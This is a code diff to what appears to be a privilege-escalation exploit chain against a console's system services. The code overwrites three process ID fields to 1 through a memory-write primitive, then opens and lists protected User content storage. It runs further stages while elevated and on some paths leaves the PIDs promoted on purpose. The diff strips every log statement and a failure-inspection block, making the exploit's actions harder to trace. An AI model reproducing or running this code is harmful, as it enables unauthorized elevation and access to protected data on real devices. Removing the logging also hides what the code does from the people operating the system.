@@ -13,7 +13,6 @@ const {
   ipcListDirectory,
   ipcStorageRead,
   ipcStorageWrite,
-  log,
   prepPacket,
   read8,
   readDomainObjects,
@@ -54,12 +53,7 @@ export async function runPromotionStep(input) {
             !promotionOutcome?.promotionRetained &&
             !promotionOutcome?.promoted) {
             workerStateSafe = false;
-            await log("PROMOTION: restoration could not be proven; skipping cache, " +
-                "save, and handle cleanup for restart recovery");
         }
-    } else {
-        await log("PROMOTION: skipped; fresh identity proof, address read, or " +
-            "retained domain session is unavailable");
     }
 
   return {promotionAttempted, promotionOutcome, promotionRestored,
@@ -176,10 +170,6 @@ export async function runPromotionAndUserStorageProbe(input) {
         if (activePlan === plan) return;
         if (!addressCopy || addressCopy.workerStateSafe === false)
             throw new Error(stageName + " refused: address-copy worker state is unsafe");
-        await log("PROMOTION: installing " + stageName + " target=0x" +
-            plan.target.toString(16) + " readOffset=0x" +
-            plan.readOffset.toString(16) + " cycle=0x" +
-            Number(plan.cycle || config.ROOT_CAPTURE_CHUNK).toString(16));
         // A failed/partial copy makes the active mapping unknown. Only a
         // successfully accepted header copy can authorize subsequent reads.
         activePlan = null;
@@ -565,10 +555,6 @@ export async function runPromotionAndUserStorageProbe(input) {
         retainedEndpoint.ready = true;
         retainedEndpointReady = true;
         addressCopy = {...addressCopy, retainedEndpointActive: true};
-        await log("PROMOTION: retained two-bucket endpoint qualified array=0x" +
-            array.toString(16) + " owner=0x" + owner.toString(16) +
-            " dataOffset=0x" + dataOffset.toString(16) +
-            " ownerCount=0 readback=true");
     }
 
     async function retireRetainedEndpoint() {
@@ -605,8 +591,6 @@ export async function runPromotionAndUserStorageProbe(input) {
         state.retired = true;
         outcome.addressCopy = {...outcome.addressCopy,
             retainedEndpointRetired: true};
-        await log("CACHE: retained endpoint retired logically; owner layout and " +
-            "count zero verified");
         return {retired: true, addressCopy: outcome.addressCopy};
     }
 
@@ -643,8 +627,6 @@ export async function runPromotionAndUserStorageProbe(input) {
             field.writeAttempted = false;
             field.writeResult = null;
         }
-        await log("PROMOTION: all 3 exact object snapshots are fresh; " +
-            "no protected filesystem command has been attempted");
 
         // -- Phase 2: Retained endpoint installation -------------------------
         await installRetainedEndpoint(verifiedIdentityTargets.retainedCache);
@@ -657,14 +639,11 @@ export async function runPromotionAndUserStorageProbe(input) {
                 throw new Error(endpointField.name +
                     " object changed during retained endpoint installation");
         }
-        await log("PROMOTION: retained endpoint reread all three original objects exactly");
 
         // -- Phase 3: PID promotion writes -----------------------------------
         for (var wi = 0; wi < fields.length; wi++) {
             var target = fields[wi];
             if (target.before === 1n) {
-                await log("PROMOTION: " + target.name +
-                    " PID already 1; no write needed");
                 continue;
             }
 
@@ -690,14 +669,6 @@ export async function runPromotionAndUserStorageProbe(input) {
                 if (after[di] !== target.beforeBytes[di])
                     changedOffsets.push("0x" + di.toString(16));
             }
-            await log("PROMOTION: " + target.name +
-                " write route=retained-two-bucket storageOffset=0x" +
-                retainedEndpoint.dataOffset.toString(16) +
-                " pidAddress=0x" + pidAddress.toString(16) +
-                " pidReadback=0x" +
-                AnalysisBytes.readU64LE(after, target.pidOffset).toString(16) +
-                " exactObject=" + exactPromoted + " changedOffsets=" +
-                (changedOffsets.join(",") || "none"));
             if (!exactPromoted)
                 throw new Error(target.name + " write did not produce the exact expected object");
         }
@@ -714,7 +685,6 @@ export async function runPromotionAndUserStorageProbe(input) {
                 throw new Error(verifiedField.name + " PID=1 full-object verification failed");
         }
         outcome.promoted = true;
-        await log("PROMOTION: all three complete objects verified with PID=1");
         // -- Phase 5: Open User content storage and list root ----------------
         var openPacket = allocPage(0x2000);
         var openReply = sendDomainCmd(domainSession.handle,
@@ -726,10 +696,6 @@ export async function runPromotionAndUserStorageProbe(input) {
         var fsObjects = openReply.ok
             ? readDomainObjects(openPacket, openReply.objCount, 0) : [];
         contentFsObjectIds = fsObjects;
-        await log("FINAL ACCESS: OpenContentStorageFileSystem(User=1) " +
-            "transport=" + hex32(openReply.transport) +
-            " result=" + hex32(openReply.result) +
-            " domainObjects=" + openReply.objCount);
         if (!openReply.ok || openReply.transport !== 0 ||
             openReply.result !== 0 || openReply.objCount !== 1)
             throw new Error("final User content-storage open failed");
@@ -747,17 +713,8 @@ export async function runPromotionAndUserStorageProbe(input) {
         outcome.listTransport = listing.readTransport;
         outcome.listResult = listing.error;
         outcome.listEntriesRead = listing.entriesRead;
-        await log("FINAL ACCESS: User content-storage root listing transport=" +
-            (listing.readTransport === null || listing.readTransport === undefined
-                ? "not-run" : hex32(listing.readTransport)) +
-            " result=" + hex32(listing.error) +
-            " entriesRead=" +
-            (listing.entriesRead === null ? "unknown" : listing.entriesRead) +
-            " entries=" + listing.entries.length);
         for (var ei = 0; ei < listing.entries.length && ei < 12; ei++) {
             var entry = listing.entries[ei];
-            await log("FINAL ACCESS: /" + entry.name + " type=" +
-                entry.type + " size=" + entry.size);
         }
         if (listing.error !== 0)
             throw new Error("User content-storage root listing failed");
@@ -797,14 +754,11 @@ export async function runPromotionAndUserStorageProbe(input) {
         };
         promotedSessionRetained = true;
         outcome.promotionRetained = true;
-        await log("PROMOTION: User storage test passed; promoted session bound " +
-            "as globalThis.fspSrv");
 
         // -- Phase 6: Run dependent stages while elevated --------------------
         if (typeof input.onElevated === "function") {
             outcome.downstreamStarted = true;
             downstreamSafeToRestore = false;
-            await log("PROMOTION: running dependent stages before restoring PID fields");
             outcome.downstream = await input.onElevated({
                 domainSession,
                 savedHandle: input.savedHandle || addressCopy.savedHandle,
@@ -833,7 +787,6 @@ export async function runPromotionAndUserStorageProbe(input) {
         }
     } catch (error) {
         outcome.error = error.message;
-        await log("PROMOTION: failed: " + error.message);
     } finally {
         // -- Cleanup: close User FS handle -----------------------------------
         if (contentFsHandle) {
@@ -841,14 +794,10 @@ export async function runPromotionAndUserStorageProbe(input) {
                 var fsClose = Number(closeHandle(contentFsHandle)) >>> 0;
                 outcome.fsCloseResult = fsClose;
                 outcome.contentFsHandleClosed = fsClose === 0;
-                await log("FINAL ACCESS: close User content filesystem rc=" +
-                    hex32(fsClose));
             } catch (error) {
                 outcome.contentFsHandleClosed = false;
                 outcome.contentFsHandleCloseError =
                     String(error?.message || error);
-                await log("FINAL ACCESS: close User content filesystem failed: " +
-                    outcome.contentFsHandleCloseError);
             }
             contentFsHandle = 0;
         }
@@ -867,10 +816,6 @@ export async function runPromotionAndUserStorageProbe(input) {
                     String(error?.message || error));
             }
         }
-        if (outcome.contentFsObjectCloseResults.length)
-            await log("FINAL ACCESS: close User filesystem objects rc=" +
-                outcome.contentFsObjectCloseResults.map(value =>
-                    typeof value === "number" ? hex32(value) : value).join(","));
         contentFsObjectIds = [];
 
         if (promotedSessionRetained) {
@@ -880,7 +825,6 @@ export async function runPromotionAndUserStorageProbe(input) {
             outcome.promotionRetained = true;
             outcome.retainedEndpointActive = retainedEndpointReady;
             outcome.restoreFailureDetails = [];
-            await log("PROMOTION: original PID fields intentionally remain at 1");
         } else if (outcome.promoted) {
             addressCopy = {...addressCopy,
                 retainedEndpointActive: retainedEndpointReady};
@@ -889,8 +833,6 @@ export async function runPromotionAndUserStorageProbe(input) {
             outcome.pidsRemainPromoted = true;
             outcome.retainedEndpointActive = retainedEndpointReady;
             outcome.restoreFailureDetails = [];
-            await log("PROMOTION: User storage test did not pass; PID fields " +
-                "remain at 1 and handles will be closed");
         } else {
             // -- Cleanup: restore original PID values ----------------------------
             var restoreOk = true;
@@ -900,8 +842,6 @@ export async function runPromotionAndUserStorageProbe(input) {
                 restoreFailureDetails.push("dependent-stages-left-live-state-unverified");
                 addressCopy = {...addressCopy, workerStateSafe: false,
                     retainedEndpointUnsafe: true};
-                await log("RESTORE: downstream phase did not prove all service, Loader, " +
-                    "and event state safe; preserve the retained endpoint for restart recovery");
             } else if (retainedEndpointReady) {
                 var restoreStates = new Array(fields.length);
                 for (var ci = 0; ci < fields.length; ci++) {
@@ -912,29 +852,21 @@ export async function runPromotionAndUserStorageProbe(input) {
                         if (AnalysisBytes.equal(checkedBytes,
                                 checkField.beforeBytes)) {
                             restoreStates[ci] = "original";
-                            await log("RESTORE: " + checkField.name +
-                                " already equals its original full-object snapshot");
                         } else if (checkField.expectedPromotedBytes &&
                                 AnalysisBytes.equal(checkedBytes,
                                     checkField.expectedPromotedBytes)) {
                             restoreStates[ci] = "promoted";
-                            await log("RESTORE: " + checkField.name +
-                                " matches the exact promoted object; retained restoration is required");
                         } else {
                             restoreStates[ci] = "unknown";
                             restoreOk = false;
                             restoreFailureDetails.push(checkField.name +
                                 ": changed-from-both-snapshots");
-                            await log("RESTORE: " + checkField.name +
-                                " differs from both snapshots; no blind write issued");
                         }
                     } catch (readError) {
                         restoreStates[ci] = "unreadable";
                         restoreOk = false;
                         restoreFailureDetails.push(checkField.name +
                             ": retained-read-failed: " + readError.message);
-                        await log("RESTORE: " + checkField.name +
-                            " unreadable through retained endpoint: " + readError.message);
                     }
                 }
 
@@ -950,8 +882,6 @@ export async function runPromotionAndUserStorageProbe(input) {
                             restoreOk = false;
                             restoreFailureDetails.push(restoreField.name +
                                 ": changed-before-restore-write");
-                            await log("RESTORE: " + restoreField.name +
-                                " differs from the exact promoted snapshot; no write issued");
                             continue;
                         }
                         await retainedWriteMemory(
@@ -962,8 +892,6 @@ export async function runPromotionAndUserStorageProbe(input) {
                             "retained restore readback");
                         var exactRestore = AnalysisBytes.equal(restoredBytes,
                             restoreField.beforeBytes);
-                        await log("RESTORE: " + restoreField.name +
-                            " route=retained-two-bucket exactObject=" + exactRestore);
                         if (!exactRestore) restoreOk = false;
                         if (!exactRestore)
                             restoreFailureDetails.push(restoreField.name +
@@ -973,8 +901,6 @@ export async function runPromotionAndUserStorageProbe(input) {
                         restoreOk = false;
                         restoreFailureDetails.push(restoreField.name +
                             ": restore-failed: " + restoreError.message);
-                        await log("RESTORE: " + restoreField.name +
-                            " failed: " + restoreError.message);
                     }
                 }
 
@@ -989,19 +915,13 @@ export async function runPromotionAndUserStorageProbe(input) {
                             restoreFailureDetails.push(fields[fi].name +
                                 ": final-object-verification-failed");
                         }
-                        await log("RESTORE: final " + fields[fi].name +
-                            " exactOriginalObject=" + exact);
                     } catch (finalReadError) {
                         restoreOk = false;
                         restoreFailureDetails.push(fields[fi].name +
                             ": final-read-failed: " + finalReadError.message);
-                        await log("RESTORE: final " + fields[fi].name +
-                            " read failed: " + finalReadError.message);
                     }
                 }
                 addressCopy = {...addressCopy, retainedEndpointActive: true};
-                await log("RESTORE: retained endpoint stays available until S21 cleanup " +
-                    "verifies retirement and closes the candidate storage handle");
             } else {
                 if (retainedSetupStarted) {
                     restoreOk = false;
@@ -1010,32 +930,13 @@ export async function runPromotionAndUserStorageProbe(input) {
                         addressCopy.workerStateSafe !== false) {
                         try {
                             await installPlan(addressPlan,
-                                "cache-retained-failure-inspection-window");
-                        } catch (planError) {
-                            await log("RESTORE: broad inspection mapping could not be reinstated: " +
-                                planError.message);
-                        }
-                    }
-                    if (activePlan === addressPlan) {
-                        for (var pi = 0; pi < fields.length; pi++) {
-                            try {
-                                var partialRead = await readObject(fields[pi],
-                                    "retained setup failure inspection", addressPlan);
-                                await log("RESTORE: " + fields[pi].name +
-                                    " PID snapshot=" +
-                                    (AnalysisBytes.equal(partialRead,
-                                        fields[pi].beforeBytes) ? "original" :
-                                        "changed/unknown"));
-                            } catch (partialError) {
-                                await log("RESTORE: " + fields[pi].name +
-                                    " inspection failed: " + partialError.message);
-                            }
+                                "cache-retained-failure-restore");
+                        } catch {
                         }
                     }
                     addressCopy = {...addressCopy,
                         workerStateSafe: false,
                         retainedEndpointUnsafe: true};
-                    await log("RESTORE: retained setup was partial; candidate retirement and save cleanup are unsafe");
                 } else {
                     for (var oi = 0; oi < fields.length; oi++) {
                         try {
@@ -1047,15 +948,11 @@ export async function runPromotionAndUserStorageProbe(input) {
                             if (!unchanged)
                                 restoreFailureDetails.push(fields[oi].name +
                                     ": original-object-changed-before-promotion");
-                            await log("RESTORE: " + fields[oi].name +
-                                " exactOriginalObject=" + unchanged);
                         } catch (originalError) {
                             restoreOk = false;
                             restoreFailureDetails.push(fields[oi].name +
                                 ": original-object-inspection-failed: " +
                                 originalError.message);
-                            await log("RESTORE: " + fields[oi].name +
-                                " inspection failed: " + originalError.message);
                         }
                     }
                 }
@@ -1063,8 +960,6 @@ export async function runPromotionAndUserStorageProbe(input) {
             outcome.restored = restoreOk;
             outcome.restoreFailureDetails = restoreFailureDetails;
             outcome.retainedEndpointActive = retainedEndpointReady;
-        await log("RESTORE: PID result=" +
-            (restoreOk ? "EXACT" : "FAILED; state is unsafe"));
         }
     }
 
